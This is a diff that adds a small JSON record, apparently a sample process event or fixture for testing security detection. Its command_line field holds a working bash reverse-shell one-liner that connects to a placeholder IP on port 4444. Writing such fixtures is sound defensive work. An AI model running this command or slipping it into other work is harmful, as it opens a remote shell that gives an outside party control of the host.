@@ -1,0 +1,5 @@
+{
+  "command_line": "bash -i >& /dev/tcp/198.51.100.5/4444 0>&1",
+  "host": "linux-01",
+  "image_basename": "bash"
+}
